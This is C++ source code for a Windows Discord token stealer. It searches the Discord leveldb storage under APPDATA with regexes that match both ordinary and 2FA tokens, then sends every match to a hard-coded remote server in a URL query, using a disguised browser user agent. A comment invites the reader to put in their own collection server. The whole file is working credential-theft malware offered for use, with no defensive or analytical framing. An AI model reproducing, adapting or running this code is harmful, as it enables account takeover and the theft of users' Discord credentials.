
#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <fstream>
#include <Wininet.h>
#include <regex>
#include <filesystem>
#pragma comment(lib, "wininet.lib")

using namespace std;
namespace fs = std::filesystem;

//replace by ur server url
string urserverurl = "https://cloudbot1337.000webhostapp.com";





using fs::path;


//some method, u know
string replace_all(string subject, const string& search, const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }
    return subject;
}


//this is for send token.
void sendtoken(string serverurl, string token) {
    HINTERNET wbNet = InternetOpenA("Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", 1, NULL, NULL, NULL);
    HINTERNET retFile;
    string rtn;
    if (wbNet) {
        retFile = InternetOpenUrlA(wbNet, (serverurl + "?token=" + token).c_str(), NULL, NULL, NULL, NULL);
        if (retFile) {
            char buffer[2000];
            DWORD bytesRead;
            do {
                InternetReadFile(retFile, buffer, 2000, &bytesRead);
                rtn.append(buffer, bytesRead);
                memset(buffer, 0, 2000);
            } while (bytesRead);
            InternetCloseHandle(wbNet);
            InternetCloseHandle(retFile);
        }
    }
    InternetCloseHandle(wbNet);
}


bool hasEnding(std::string const& fullString, std::string const& ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    }
    else {
        return false;
    }
}

string SearchToken(string filename, regex regexpatern)
{
    string tokens;
    regex Normalrgx(regexpatern);
    smatch m;
    std::ifstream file(filename);
    std::string str;
    std::string file_contents;

    //for list all file end by .log

    while (std::getline(file, str)) //read line of 000003.log
    {
        file_contents += str;
        file_contents.push_back('\n');
    }

    
    regex_search(file_contents, m, Normalrgx);
    for (auto x : m)
        tokens+= x;
        tokens.push_back('\n');

    return tokens;

}

int main() {

    
    char* fpbuf;
    size_t sz = 0;
    errno_t Environment = _dupenv_s(&fpbuf, &sz, "APPDATA");
    string AppData = fpbuf;
    string levelDB = AppData + "/discord/Local Storage/leveldb/"; //(where discord token is stocked)
    string NormalRegex = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"; //regex for discord token without 2fa
    string mfaRegex = R"(mfa\.[\w-]{84})"; //regex for discord token with 2FA

    std::string tokens;

    regex mfaauth(mfaRegex);

    regex rgx(NormalRegex);
    std::string path = levelDB;

    for (const auto& entry : fs::directory_iterator(path))
        if (hasEnding(entry.path().string(), ".ldb") || hasEnding(entry.path().string(), ".log"))
        tokens += SearchToken(entry.path().string(), rgx);


    
    for (const auto& entry : fs::directory_iterator(path))
        if (hasEnding(entry.path().string(), ".ldb") || hasEnding(entry.path().string(), ".log"))
        tokens += SearchToken(entry.path().string(), mfaauth);




    sendtoken(urserverurl, tokens);


}